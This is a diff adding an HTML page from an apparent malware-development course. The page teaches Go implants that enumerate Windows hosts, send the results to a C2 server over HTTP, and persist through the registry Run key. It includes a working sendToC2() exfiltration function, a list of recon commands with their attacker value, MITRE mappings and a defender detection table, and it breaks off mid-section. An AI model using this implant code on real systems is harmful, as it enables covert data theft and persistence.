@@ -1,0 +1,1095 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Reconnaissance — Go Payload Series</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Syne:wght@400;600;800&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:        #0a0c10;
+      --bg2:       #111520;
+      --bg3:       #181d2b;
+      --bg-code:   #0d1117;
+      --border:    #232a3e;
+      --border2:   #2e3758;
+      --text:      #c8cfe0;
+      --text-dim:  #5a6480;
+      --text-head: #eef0f8;
+      --amber:     #f0a030;
+      --amber-dim: rgba(240,160,48,.12);
+      --red:       #e03a3a;
+      --green:     #2ecc71;
+      --blue:      #4a8fff;
+      --purple:    #8b5cf6;
+      --teal:      #2dd4bf;
+      --mono:      'JetBrains Mono', monospace;
+      --sans:      'Syne', sans-serif;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--sans);
+      font-size: 15px;
+      line-height: 1.6;
+      min-height: 100vh;
+    }
+
+    /* ── NAV ─────────────────────────────────────────────── */
+    header {
+      border-bottom: 1px solid var(--border);
+      background: var(--bg);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .header-inner {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 0 32px;
+      display: flex;
+      align-items: center;
+      gap: 40px;
+      height: 56px;
+    }
+    .logo {
+      font-family: var(--mono);
+      font-size: 13px;
+      color: var(--amber);
+      font-weight: 600;
+      letter-spacing: .04em;
+      white-space: nowrap;
+      text-decoration: none;
+    }
+    .logo span { color: var(--text-dim); }
+    nav { display: flex; gap: 4px; flex: 1; }
+    nav a {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-dim);
+      text-decoration: none;
+      padding: 6px 12px;
+      border-radius: 4px;
+      transition: color .15s, background .15s;
+      letter-spacing: .03em;
+    }
+    nav a:hover { color: var(--text); background: var(--bg3); }
+    nav a.active { color: var(--amber); background: rgba(240,160,48,.08); }
+
+    /* ── LAYOUT ──────────────────────────────────────────── */
+    .page-wrap {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 56px 32px 96px;
+      display: grid;
+      grid-template-columns: 220px 1fr;
+      gap: 48px;
+      align-items: start;
+    }
+
+    /* ── SIDEBAR ─────────────────────────────────────────── */
+    .sidebar {
+      position: sticky;
+      top: 80px;
+    }
+    .sidebar-label {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--text-dim);
+      text-transform: uppercase;
+      letter-spacing: .1em;
+      margin-bottom: 12px;
+    }
+    .sidebar-nav { display: flex; flex-direction: column; gap: 2px; }
+    .sidebar-nav a {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-dim);
+      text-decoration: none;
+      padding: 7px 12px;
+      border-radius: 4px;
+      border-left: 2px solid transparent;
+      transition: all .15s;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .sidebar-nav a:hover { color: var(--text); background: var(--bg2); }
+    .sidebar-nav a.active { color: var(--amber); border-left-color: var(--amber); background: var(--amber-dim); }
+    .sidebar-nav .ver-badge {
+      font-size: 10px;
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      padding: 1px 5px;
+      border-radius: 3px;
+      margin-left: auto;
+      color: var(--text-dim);
+    }
+    .sidebar-divider {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 12px 0;
+    }
+    .sidebar-dl-header {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--text-dim);
+      text-transform: uppercase;
+      letter-spacing: .1em;
+      margin-bottom: 8px;
+    }
+    .sidebar-dl-link {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--amber);
+      text-decoration: none;
+      padding: 6px 8px;
+      border-radius: 4px;
+      border: 1px solid rgba(240,160,48,.2);
+      background: var(--amber-dim);
+      margin-bottom: 6px;
+      transition: border-color .15s, background .15s;
+    }
+    .sidebar-dl-link:hover { border-color: var(--amber); background: rgba(240,160,48,.18); }
+    .sidebar-dl-link.placeholder {
+      color: var(--text-dim);
+      border-color: var(--border);
+      background: transparent;
+      pointer-events: none;
+      opacity: .5;
+    }
+    .sidebar-dl-icon { font-size: 13px; }
+
+    /* ── MAIN CONTENT ────────────────────────────────────── */
+    .content { min-width: 0; }
+
+    /* ── PAGE HERO ───────────────────────────────────────── */
+    .page-hero {
+      margin-bottom: 52px;
+      border-left: 3px solid var(--amber);
+      padding-left: 24px;
+    }
+    .page-hero .eyebrow {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--amber);
+      letter-spacing: .1em;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+    }
+    .page-hero h1 {
+      font-size: 38px;
+      font-weight: 800;
+      color: var(--text-head);
+      line-height: 1.1;
+      margin-bottom: 14px;
+    }
+    .page-hero p {
+      color: var(--text-dim);
+      font-family: var(--mono);
+      font-size: 13px;
+      max-width: 580px;
+      line-height: 1.7;
+    }
+
+    /* ── MITRE STRIP ─────────────────────────────────────── */
+    .mitre-strip {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+      margin-bottom: 52px;
+    }
+    .mitre-chip {
+      font-family: var(--mono);
+      font-size: 11px;
+      padding: 4px 10px;
+      border-radius: 4px;
+      background: rgba(74,143,255,.08);
+      border: 1px solid rgba(74,143,255,.2);
+      color: var(--blue);
+    }
+    .mitre-chip span { color: var(--text-dim); }
+
+    /* ── VERSION SECTIONS ────────────────────────────────── */
+    .version-section {
+      margin-bottom: 72px;
+      scroll-margin-top: 80px;
+    }
+
+    .version-header {
+      display: flex;
+      align-items: flex-start;
+      gap: 18px;
+      margin-bottom: 28px;
+      padding-bottom: 20px;
+      border-bottom: 1px solid var(--border);
+    }
+    .ver-num {
+      background: var(--amber-dim);
+      border: 1px solid rgba(240,160,48,.3);
+      color: var(--amber);
+      font-family: var(--mono);
+      font-size: 11px;
+      font-weight: 600;
+      padding: 6px 12px;
+      border-radius: 6px;
+      white-space: nowrap;
+      flex-shrink: 0;
+      margin-top: 4px;
+    }
+    .version-header-text h2 {
+      font-size: 24px;
+      font-weight: 800;
+      color: var(--text-head);
+      margin-bottom: 6px;
+    }
+    .version-header-text p {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-dim);
+      line-height: 1.6;
+    }
+    .version-status {
+      margin-left: auto;
+      flex-shrink: 0;
+    }
+    .status-pill {
+      font-family: var(--mono);
+      font-size: 11px;
+      padding: 4px 12px;
+      border-radius: 99px;
+      font-weight: 600;
+    }
+    .status-done { background: rgba(46,204,113,.1); color: var(--green); border: 1px solid rgba(46,204,113,.25); }
+
+    /* ── LESSON BODY ─────────────────────────────────────── */
+    .lesson-body { display: flex; flex-direction: column; gap: 28px; }
+
+    .section-label {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--amber);
+      text-transform: uppercase;
+      letter-spacing: .1em;
+      margin-bottom: 10px;
+    }
+
+    h3 {
+      font-size: 17px;
+      font-weight: 600;
+      color: var(--text-head);
+      margin-bottom: 10px;
+    }
+
+    p { color: var(--text); font-size: 14px; line-height: 1.75; margin-bottom: 8px; }
+
+    /* ── INFO CARDS ──────────────────────────────────────── */
+    .info-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+      gap: 10px;
+    }
+    .info-card {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 7px;
+      padding: 14px 16px;
+    }
+    .info-card-label {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--text-dim);
+      text-transform: uppercase;
+      letter-spacing: .08em;
+      margin-bottom: 6px;
+    }
+    .info-card-val {
+      font-family: var(--mono);
+      font-size: 13px;
+      color: var(--text-head);
+      font-weight: 600;
+    }
+
+    /* ── MITRE TABLE ─────────────────────────────────────── */
+    .mitre-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-family: var(--mono);
+      font-size: 12px;
+    }
+    .mitre-table th {
+      background: var(--bg3);
+      color: var(--text-dim);
+      text-transform: uppercase;
+      letter-spacing: .06em;
+      font-size: 10px;
+      font-weight: 600;
+      padding: 10px 14px;
+      text-align: left;
+      border-bottom: 1px solid var(--border);
+    }
+    .mitre-table td {
+      padding: 10px 14px;
+      border-bottom: 1px solid var(--border);
+      color: var(--text);
+      vertical-align: top;
+    }
+    .mitre-table tr:last-child td { border-bottom: none; }
+    .mitre-table tr:nth-child(odd) td { background: var(--bg2); }
+    .mitre-table tr:nth-child(even) td { background: var(--bg); }
+    .tid { color: var(--blue); font-weight: 600; }
+    .t-hi { color: var(--red); font-weight: 600; }
+    .t-md { color: var(--amber); font-weight: 600; }
+    .tier-b { color: var(--text-dim); }
+
+    /* ── CODE BLOCK ──────────────────────────────────────── */
+    .code-wrap {
+      background: var(--bg-code);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .code-bar {
+      background: var(--bg3);
+      border-bottom: 1px solid var(--border);
+      padding: 8px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .code-bar-filename {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--amber);
+    }
+    .code-bar-lang {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--text-dim);
+      text-transform: uppercase;
+      letter-spacing: .06em;
+    }
+    .code-scroll { overflow-x: auto; }
+    pre {
+      margin: 0;
+      padding: 20px 20px;
+      font-family: var(--mono);
+      font-size: 12.5px;
+      line-height: 1.7;
+      color: #abb2bf;
+      white-space: pre;
+    }
+    .c-kw  { color: #c678dd; }   /* keywords: func, for, if */
+    .c-fn  { color: #61afef; }   /* function names */
+    .c-str { color: #98c379; }   /* strings */
+    .c-cm  { color: #5c6370; font-style: italic; } /* comments */
+    .c-pkg { color: #e5c07b; }   /* package names */
+    .c-num { color: #d19a66; }   /* numbers */
+    .c-ty  { color: #e06c75; }   /* types */
+
+    /* ── WHAT CHANGED BLOCK ──────────────────────────────── */
+    .diff-block {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .diff-header {
+      background: var(--bg3);
+      padding: 10px 16px;
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--text-dim);
+      border-bottom: 1px solid var(--border);
+    }
+    .diff-row {
+      display: flex;
+      gap: 0;
+      border-bottom: 1px solid var(--border);
+      font-family: var(--mono);
+      font-size: 12px;
+    }
+    .diff-row:last-child { border-bottom: none; }
+    .diff-mark {
+      width: 36px;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      font-weight: 600;
+    }
+    .diff-mark.add { background: rgba(46,204,113,.07); color: var(--green); }
+    .diff-mark.same { background: transparent; color: var(--text-dim); }
+    .diff-content { padding: 8px 14px; flex: 1; }
+    .diff-content strong { color: var(--text-head); }
+    .diff-content .dim { color: var(--text-dim); }
+
+    /* ── DOWNLOAD CARD ───────────────────────────────────── */
+    .download-row {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    .dl-card {
+      flex: 1;
+      min-width: 220px;
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 16px 18px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      text-decoration: none;
+      transition: border-color .15s, background .15s;
+    }
+    .dl-card:hover { border-color: var(--amber); background: var(--bg3); }
+    .dl-card.placeholder {
+      opacity: .45;
+      pointer-events: none;
+    }
+    .dl-icon {
+      width: 38px;
+      height: 38px;
+      border-radius: 7px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      flex-shrink: 0;
+    }
+    .dl-icon-go   { background: rgba(0,173,216,.12); border: 1px solid rgba(0,173,216,.2); }
+    .dl-icon-docx { background: rgba(74,143,255,.12); border: 1px solid rgba(74,143,255,.2); }
+    .dl-info { flex: 1; min-width: 0; }
+    .dl-filename {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-head);
+      font-weight: 600;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      margin-bottom: 3px;
+    }
+    .dl-meta {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--text-dim);
+    }
+    .dl-arrow { color: var(--amber); font-size: 16px; flex-shrink: 0; }
+    .dl-card.placeholder .dl-arrow { color: var(--text-dim); }
+
+    /* ── DETECTION TABLE ─────────────────────────────────── */
+    .detect-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-family: var(--mono);
+      font-size: 12px;
+    }
+    .detect-table th {
+      background: var(--bg3);
+      color: var(--text-dim);
+      text-transform: uppercase;
+      letter-spacing: .06em;
+      font-size: 10px;
+      font-weight: 600;
+      padding: 10px 14px;
+      text-align: left;
+      border-bottom: 1px solid var(--border);
+    }
+    .detect-table td {
+      padding: 10px 14px;
+      border-bottom: 1px solid var(--border);
+      color: var(--text);
+      line-height: 1.5;
+      vertical-align: top;
+    }
+    .detect-table tr:last-child td { border-bottom: none; }
+    .detect-table tr:nth-child(odd) td { background: var(--bg2); }
+    .detect-table tr:nth-child(even) td { background: var(--bg); }
+    .evt { color: var(--purple); font-weight: 600; }
+    .high { color: var(--red); font-weight: 600; }
+    .med  { color: var(--amber); }
+
+    /* ── SECTION DIVIDER ─────────────────────────────────── */
+    .section-sep {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 60px 0;
+    }
+
+    /* ── CALLOUT BOX ─────────────────────────────────────── */
+    .callout {
+      border-left: 3px solid var(--amber);
+      background: rgba(240,160,48,.05);
+      border-radius: 0 6px 6px 0;
+      padding: 14px 18px;
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text);
+      line-height: 1.7;
+    }
+    .callout strong { color: var(--amber); }
+    .callout.info { border-left-color: var(--blue); background: rgba(74,143,255,.05); }
+    .callout.info strong { color: var(--blue); }
+    .callout.danger { border-left-color: var(--red); background: rgba(224,58,58,.05); }
+    .callout.danger strong { color: var(--red); }
+
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 24px 32px;
+      text-align: center;
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--text-dim);
+    }
+
+    @media (max-width: 768px) {
+      .page-wrap { grid-template-columns: 1fr; }
+      .sidebar { position: static; }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="header-inner">
+    <a href="/" class="logo">recon<span>.</span>beacon</a>
+    <nav>
+      <a href="/">Home</a>
+      <a href="/lessons">Lessons</a>
+      <a href="/recon" class="active">Recon</a>
+      <a href="/c2">C2 Server</a>
+      <a href="/obfuscation">Obfuscation</a>
+     
+    </nav>
+  </div>
+</header>
+
+<div class="page-wrap">
+
+  <!-- ── SIDEBAR ──────────────────────────────────────────── -->
+  <aside class="sidebar">
+    <div class="sidebar-label">// on this page</div>
+    <nav class="sidebar-nav">
+      <a href="#overview" class="active">Overview</a>
+      <a href="#v1">v1 — Basic recon <span class="ver-badge">L02</span></a>
+      <a href="#v2">v2 — Expanded recon <span class="ver-badge">L03–04</span></a>
+      <a href="#v3">v3 — Full payload <span class="ver-badge">L05</span></a>
+    </nav>
+
+    <hr class="sidebar-divider">
+    <div class="sidebar-dl-header">// .go source files</div>
+
+    <a href="{{ url_for('static', filename='downloads/net_scan.go') }}" download class="sidebar-dl-link">
+      <span class="sidebar-dl-icon">↓</span> net_scan.go
+    </a>
+    <a href="{{ url_for('static', filename='downloads/net_scan_v2.go') }}" download class="sidebar-dl-link">
+      <span class="sidebar-dl-icon">↓</span> net_scan_v2.go
+    </a>
+    <a href="{{ url_for('static', filename='downloads/net_scan_v3.go') }}" download class="sidebar-dl-link">
+      <span class="sidebar-dl-icon">↓</span> net_scan_v3.go
+    </a>
+
+    <hr class="sidebar-divider">
+    <div class="sidebar-dl-header">// word doc walkthroughs</div>
+
+    <a href="{{ url_for('static', filename='downloads/Lesson_01_net_scan_v1.docx') }}" download class="sidebar-dl-link">
+      <span class="sidebar-dl-icon">↓</span> Lesson 01.docx
+    </a>
+    <a href="{{ url_for('static', filename='downloads/Lesson_02_net_scan_v2.docx') }}" download class="sidebar-dl-link">
+      <span class="sidebar-dl-icon">↓</span> Lesson 02.docx
+    </a>
+    <a href="{{ url_for('static', filename='downloads/Lesson_03_net_scan_v3.docx') }}" download class="sidebar-dl-link">
+      <span class="sidebar-dl-icon">↓</span> Lesson 03.docx
+    </a>
+  </aside>
+
+  <!-- ── MAIN CONTENT ────────────────────────────────────── -->
+  <main class="content">
+
+    <!-- Page hero -->
+    <div class="page-hero" id="overview">
+      <div class="eyebrow">// phase 02</div>
+      <h1>Reconnaissance</h1>
+      <p>Three versioned Go payloads — from a minimal single-run recon tool to a fully looping beacon with registry persistence. Each version is a complete, runnable .exe that builds on the last.</p>
+    </div>
+
+    <!-- MITRE strip -->
+    <div class="mitre-strip">
+      <div class="mitre-chip"><span>T1082</span> · System Info</div>
+      <div class="mitre-chip"><span>T1016</span> · Network Config</div>
+      <div class="mitre-chip"><span>T1049</span> · Network Connections</div>
+      <div class="mitre-chip"><span>T1069.001</span> · Local Groups</div>
+      <div class="mitre-chip"><span>T1057</span> · Process Discovery</div>
+      <div class="mitre-chip"><span>T1033</span> · User Discovery</div>
+      <div class="mitre-chip"><span>T1547.001</span> · Run Key Persist.</div>
+      <div class="mitre-chip"><span>T1071.001</span> · HTTP Beaconing</div>
+    </div>
+
+
+    <!-- ════════════════════════════════════════════════════ -->
+    <!--  VERSION 1                                          -->
+    <!-- ════════════════════════════════════════════════════ -->
+    <section class="version-section" id="v1">
+      <div class="version-header">
+        <div class="ver-num">v1</div>
+        <div class="version-header-text">
+          <h2>net_scan.go — Basic Recon + Single Beacon</h2>
+          <p>Network interfaces · systeminfo · file write · one HTTP POST to C2</p>
+        </div>
+        <div class="version-status">
+          <span class="status-pill status-done">Complete</span>
+        </div>
+      </div>
+
+      <div class="lesson-body">
+
+        <div>
+          <div class="section-label">what you're building</div>
+          <p>The first functional payload. It gathers two types of data — network interfaces using Go's native <code>net</code> package and full system information via <code>systeminfo</code> — writes the output to <code>C:\temp\</code>, and exfiltrates the file to the Flask C2 server with a single HTTP POST. No loop, no persistence. One run, one beacon.</p>
+          <p>The key lesson here is why Go is used for implant development: one <code>go build</code> command produces a fully static <code>.exe</code> with zero runtime dependencies on the target machine. No Python interpreter, no .NET runtime, nothing to install.</p>
+        </div>
+
+        <div class="callout info">
+          <strong>Native API vs exec.Command</strong><br>
+          v1 introduces both techniques. <code>net.Interfaces()</code> calls the Go standard library directly — no child process is spawned. <code>exec.Command("cmd", "/C", "systeminfo")</code> shells out and creates a visible cmd.exe child process in the process tree. Both approaches appear throughout the series.
+        </div>
+
+        <div>
+          <div class="section-label">mitre att&ck coverage</div>
+          <table class="mitre-table">
+            <thead>
+              <tr><th>Technique</th><th>Name</th><th>How it maps</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td class="tid">T1016</td>
+                <td>System Network Config</td>
+                <td>net.Interfaces() enumerates NICs, IPs, MACs — no cmd.exe spawned</td>
+              </tr>
+              <tr>
+                <td class="tid">T1082</td>
+                <td>System Info Discovery</td>
+                <td>systeminfo returns OS, hotfixes, domain, BIOS, memory</td>
+              </tr>
+              <tr>
+                <td class="tid">T1074.001</td>
+                <td>Local Data Staging</td>
+                <td>C:\temp\recon_combined.txt is a forensic artefact on disk</td>
+              </tr>
+              <tr>
+                <td class="tid">T1041</td>
+                <td>Exfil over C2 Channel</td>
+                <td>HTTP POST with X-Host and X-Filename headers to Flask listener</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div>
+          <div class="section-label">key code — sendToC2()</div>
+          <div class="code-wrap">
+            <div class="code-bar">
+              <span class="code-bar-filename">net_scan.go</span>
+              <span class="code-bar-lang">Go</span>
+            </div>
+            <div class="code-scroll">
+<pre><span class="c-kw">func</span> <span class="c-fn">sendToC2</span>(url, filepath, hostID <span class="c-ty">string</span>) {
+    data, err := <span class="c-pkg">os</span>.<span class="c-fn">ReadFile</span>(filepath)
+    <span class="c-kw">if</span> err != <span class="c-kw">nil</span> { <span class="c-kw">return</span> }
+
+    req, err := <span class="c-pkg">http</span>.<span class="c-fn">NewRequest</span>(<span class="c-str">"POST"</span>, url, <span class="c-pkg">bytes</span>.<span class="c-fn">NewReader</span>(data))
+    <span class="c-kw">if</span> err != <span class="c-kw">nil</span> { <span class="c-kw">return</span> }
+
+    <span class="c-cm">// Custom headers Flask C2 expects</span>
+    req.Header.<span class="c-fn">Set</span>(<span class="c-str">"Content-Type"</span>, <span class="c-str">"application/octet-stream"</span>)
+    req.Header.<span class="c-fn">Set</span>(<span class="c-str">"X-Filename"</span>, <span class="c-str">"recon_combined.txt"</span>)
+    req.Header.<span class="c-fn">Set</span>(<span class="c-str">"X-Host"</span>, hostID)  <span class="c-cm">// identifies target machine</span>
+
+    client := &amp;<span class="c-ty">http.Client</span>{ Timeout: <span class="c-num">10</span> * <span class="c-pkg">time</span>.Second }
+    resp, err := client.<span class="c-fn">Do</span>(req)
+    <span class="c-kw">if</span> err != <span class="c-kw">nil</span> { <span class="c-kw">return</span> }
+    <span class="c-kw">defer</span> resp.Body.<span class="c-fn">Close</span>()
+}</pre>
+            </div>
+          </div>
+        </div>
+
+        <div>
+          <div class="section-label">detection surface</div>
+          <table class="detect-table">
+            <thead><tr><th>Method</th><th>Signal</th><th>Noise level</th></tr></thead>
+            <tbody>
+              <tr><td class="evt">Sysmon EID 1</td><td>cmd.exe child of payload with systeminfo argument</td><td class="high">High</td></tr>
+              <tr><td class="evt">Sysmon EID 11</td><td>File created at C:\temp\recon_combined.txt</td><td class="med">Medium</td></tr>
+              <tr><td class="evt">Network IDS</td><td>HTTP POST to non-standard port with X-Host header</td><td class="high">High</td></tr>
+              <tr><td class="evt">AV hash</td><td>SHA-256 of .exe — changes on every recompile</td><td class="dim">Low</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div>
+          <div class="section-label">downloads</div>
+          <div class="download-row">
+            <a href="{{ url_for('static', filename='downloads/net_scan.go') }}" download class="dl-card">
+              <div class="dl-icon dl-icon-go">🐹</div>
+              <div class="dl-info">
+                <div class="dl-filename">net_scan.go</div>
+                <div class="dl-meta">Go source · v1 · basic recon</div>
+              </div>
+              <span class="dl-arrow">↓</span>
+            </a>
+            <a href="{{ url_for('static', filename='downloads/Lesson_01_net_scan_v1.docx') }}" download class="dl-card">
+              <div class="dl-icon dl-icon-docx">📄</div>
+              <div class="dl-info">
+                <div class="dl-filename">Lesson_01_net_scan_v1.docx</div>
+                <div class="dl-meta">Word doc · full walkthrough + exercises</div>
+              </div>
+              <span class="dl-arrow">↓</span>
+            </a>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <hr class="section-sep">
+
+    <!-- ════════════════════════════════════════════════════ -->
+    <!--  VERSION 2                                          -->
+    <!-- ════════════════════════════════════════════════════ -->
+    <section class="version-section" id="v2">
+      <div class="version-header">
+        <div class="ver-num">v2</div>
+        <div class="version-header-text">
+          <h2>net_scan_v2.go — Expanded Host Recon</h2>
+          <p>Six additional high-value intelligence commands added on top of v1</p>
+        </div>
+        <div class="version-status">
+          <span class="status-pill status-done">Complete</span>
+        </div>
+      </div>
+
+      <div class="lesson-body">
+
+        <div>
+          <div class="section-label">what's new in v2</div>
+          <p>Version 2 extends the data collection from v1 with six high-value enumeration commands. The architecture — file write, sendToC2(), imports — is completely unchanged. Only the collection section inside main() grows. This additive pattern mirrors real implant development: you start with a minimal working beacon and layer capability on top.</p>
+        </div>
+
+        <div>
+          <div class="section-label">command breakdown — what each one collects</div>
+          <table class="mitre-table">
+            <thead>
+              <tr><th>Tier</th><th>Command</th><th>MITRE</th><th>Attacker value</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td style="color:#e03a3a;font-weight:600">★★★</td>
+                <td>netstat -ano</td>
+                <td class="tid">T1049</td>
+                <td>Active connections + owning PIDs — cross-ref with tasklist to find C2, RDP sessions</td>
+              </tr>
+              <tr>
+                <td style="color:#e03a3a;font-weight:600">★★★</td>
+                <td>net localgroup administrators</td>
+                <td class="tid">T1069.001</td>
+                <td>Lists all local and domain admin accounts — informs lateral movement and privesc targets</td>
+              </tr>
+              <tr>
+                <td style="color:#e03a3a;font-weight:600">★★★</td>
+                <td>tasklist /fo csv</td>
+                <td class="tid">T1057</td>
+                <td>CSV format enables programmatic AV/EDR fingerprinting by process name</td>
+              </tr>
+              <tr>
+                <td style="color:#f0a030">★★</td>
+                <td>quser</td>
+                <td class="tid">T1033</td>
+                <td>Idle time reveals if machine is in active use — critical for OPSEC timing decisions</td>
+              </tr>
+              <tr>
+                <td style="color:#f0a030">★★</td>
+                <td>arp -a</td>
+                <td class="tid">T1016</td>
+                <td>Passive subnet mapping — reveals adjacent hosts without any active scanning</td>
+              </tr>
+              <tr>
+                <td style="color:#f0a030">★★</td>
+                <td>wmic logicaldisk</td>
+                <td class="tid">T1082</td>
+                <td>Free space check — determines if host can stage large tools or memory dumps</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div>
+          <div class="section-label">what changed from v1</div>
+          <div class="diff-block">
+            <div class="diff-header">// diff summary — net_scan.go → net_scan_v2.go</div>
+            <div class="diff-row">
+              <div class="diff-mark same">=</div>
+              <div class="diff-content"><strong>Imports</strong> <span class="dim">— identical, no new packages needed</span></div>
+            </div>
+            <div class="diff-row">
+              <div class="diff-mark same">=</div>
+              <div class="diff-content"><strong>Network interfaces block</strong> <span class="dim">— unchanged</span></div>
+            </div>
+            <div class="diff-row">
+              <div class="diff-mark same">=</div>
+              <div class="diff-content"><strong>systeminfo block</strong> <span class="dim">— unchanged</span></div>
+            </div>
+            <div class="diff-row">
+              <div class="diff-mark add">+</div>
+              <div class="diff-content"><strong>netstat -ano</strong> <span class="dim">— active network connections with PIDs</span></div>
+            </div>
+            <div class="diff-row">
+              <div class="diff-mark add">+</div>
+              <div class="diff-content"><strong>net localgroup administrators</strong> <span class="dim">— admin account enumeration</span></div>
+            </div>
+            <div class="diff-row">
+              <div class="diff-mark add">+</div>
+              <div class="diff-content"><strong>tasklist /fo csv</strong> <span class="dim">— running process list in parseable format</span></div>
+            </div>
+            <div class="diff-row">
+              <div class="diff-mark add">+</div>
+              <div class="diff-content"><strong>quser</strong> <span class="dim">— active session and idle time</span></div>
+            </div>
+            <div class="diff-row">
+              <div class="diff-mark add">+</div>
+              <div class="diff-content"><strong>arp -a</strong> <span class="dim">— passive ARP cache, adjacent hosts</span></div>
+            </div>
+            <div class="diff-row">
+              <div class="diff-mark add">+</div>
+              <div class="diff-content"><strong>wmic logicaldisk</strong> <span class="dim">— disk size and free space</span></div>
+            </div>
+            <div class="diff-row">
+              <div class="diff-mark same">=</div>
+              <div class="diff-content"><strong>os.WriteFile + sendToC2()</strong> <span class="dim">— identical</span></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="callout">
+          <strong>Detection note on wmic:</strong> wmic.exe is one of the most heavily monitored executables in enterprise EDR rule sets. Any process spawning wmic as a child is flagged by most commercial EDR products. This is a Artifacts-level indicator — relatively easy for a defender to block, and equally easy for an attacker to swap out for a PowerShell CIM equivalent.
+        </div>
+
+        <div>
+          <div class="section-label">downloads</div>
+          <div class="download-row">
+            <a href="{{ url_for('static', filename='downloads/net_scan_v2.go') }}" download class="dl-card">
+              <div class="dl-icon dl-icon-go">🐹</div>
+              <div class="dl-info">
+                <div class="dl-filename">net_scan_v2.go</div>
+                <div class="dl-meta">Go source · v2 · expanded recon</div>
+              </div>
+              <span class="dl-arrow">↓</span>
+            </a>
+            <a href="{{ url_for('static', filename='downloads/Lesson_02_net_scan_v2.docx') }}" download class="dl-card">
+              <div class="dl-icon dl-icon-docx">📄</div>
+              <div class="dl-info">
+                <div class="dl-filename">Lesson_02_net_scan_v2.docx</div>
+                <div class="dl-meta">Word doc · full walkthrough + MITRE table</div>
+              </div>
+              <span class="dl-arrow">↓</span>
+            </a>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <hr class="section-sep">
+
+    <!-- ════════════════════════════════════════════════════ -->
+    <!--  VERSION 3                                          -->
+    <!-- ════════════════════════════════════════════════════ -->
+    <section class="version-section" id="v3">
+      <div class="version-header">
+        <div class="ver-num">v3</div>
+        <div class="version-header-text">
+          <h2>net_scan_v3.go — Registry Persistence + Beacon Loop</h2>
+          <p>The complete payload — survives reboots, beacons every 60 seconds indefinitely</p>
+        </div>
+        <div class="version-status">
+          <span class="status-pill status-done">Complete</span>
+        </div>
+      </div>
+
+      <div class="lesson-body">
+
+        <div>
+          <div class="section-label">what's new in v3</div>
+          <p>Version 3 is the full operational payload — every feature from v1 and v2 plus two major additions: Windows Registry persistence that survives machine reboots, and an infinite 60-second beacon loop. From this version onward, every obfuscation lesson modifies this file as its base.</p>
+        </div>
+
+        <div>
+          <div class="section-label">execution flow</div>
+          <div class="info-grid">
+            <div class="info-card">
+              <div class="info-card-label">Stage 1 — Startup</div>
+              <div class="info-card-val">os.Executable()</div>
+            </div>
+            <div class="info-card">
+              <div class="info-card-label">Stage 2 — Persist</div>
+              <div class="info-card-val">reg add HKCU\Run</div>
+            </div>
+            <div class="info-card">
+              <div class="info-card-label">Stage 3 — Loop</div>
+              <div class="info-card-val">for { ... }</div>
+            </div>
+            <div class="info-card">
+              <div class="info-card-label">Stage 4 — Collect</div>
+              <div class="info-card-val">All 6 commands</div>
+            </div>
+            <div class="info-card">
+              <div class="info-card-label">Stage 5 — Write</div>
